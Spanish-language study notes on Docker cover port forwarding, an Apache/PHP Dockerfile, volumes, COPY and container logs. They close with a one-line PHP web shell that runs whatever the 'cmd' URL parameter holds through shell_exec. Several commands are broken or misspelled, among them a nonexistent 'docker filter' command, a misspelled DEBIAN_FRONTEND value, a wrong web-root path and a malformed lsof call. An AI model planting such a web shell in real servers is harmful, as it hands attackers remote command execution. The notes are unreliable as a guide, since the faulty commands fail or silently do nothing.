El port forwarding se utiliza para que un puerto de nuestra maquina sea un puerto del contenedor ejemplo que el puerto 80 de mi maquina sea el de el contendor para esto se utiliza el por forwarding 

Nuevo Dockerfile
```
FROM ubuntu:latest    
MAINTAINER Adrian Alonso "adrian@correo.com"

#Evitar que entre en modo interactiovo
ENV DEBIAN_FRONTEND nonineractive

RUN apt update && apt install -y net-tools \
iputils-ping \
curl \
git \
nano \
apache2 \
php 

#PORTFORWARDING
EXPOSE 80

#Para indicar que comando quiero se ejecute apenas se despliegue el contenedor
ENTRYPOINT service apache2 start && /bin/bash
```

En ocasiones nos pueden salir imagenes con NAME none y TAG  none pondemos filtrarlas con 

```
docker filter --filter "dangling=true" -q
docker rmi $( docker filter --filter "dangling=true" -q)
-q Nos devuelve solo el identificador de la img
```


Crear la img a partir del dockerfile

```
docker build -t webserver .

docker run -dit -p 80:80 --name mywebserver webserver

#Mostrar el puerto que utiliza el contenedor 
docker port mywebserver

#Revisar si algun servicio esta ocupando el puerto 80
lsof -i 80
```


Crear una carpeta cincronizada entre mi pc y el contenedor
```
docker run -dit -p 80:80 -v /home/adr/web:/var/www/hml --name mywebserver webserver

/home/adr/web #Carpeta en la pc fisica
/var/www/hml  #Carpeta a mapear en el container
```


También en el dockerfile podemos indicar que se copie archivos desde nuestra maquina al contenedor al momento de la creación
```
FROM ubuntu:latest    
MAINTAINER Adrian Alonso "adrian@correo.com"

#Evitar que entre en modo interactiovo
ENV DEBIAN_FRONTEND nonineractive

RUN apt update && apt install -y net-tools \
iputils-ping \
curl \
git \
nano \
apache2 \
php 

#Copiar al contenedor
COPY prueba.txt /var/www/html/
#PORTFORWARDING
EXPOSE 80

#Para indicar que comando quiero se ejecute apenas se despliegue el contenedor
ENTRYPOINT service apache2 start && /bin/bash
```

Ver logs de un contenedor
```
docker logs id_contenedor

#Para ver logs en tiempo real
docker logs id_contenedor -f

```



Ejecucion de comandos mediante archivo php
```
<?php
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
?>


#Comentarios
<pre>  Para que las respuesas esten preformateada
shell_exec  Indica a php que va a ejecuar comandos
$_GET['cmd'] Se ejecutara lo que se pase por parametroe en el parametro cmd
```

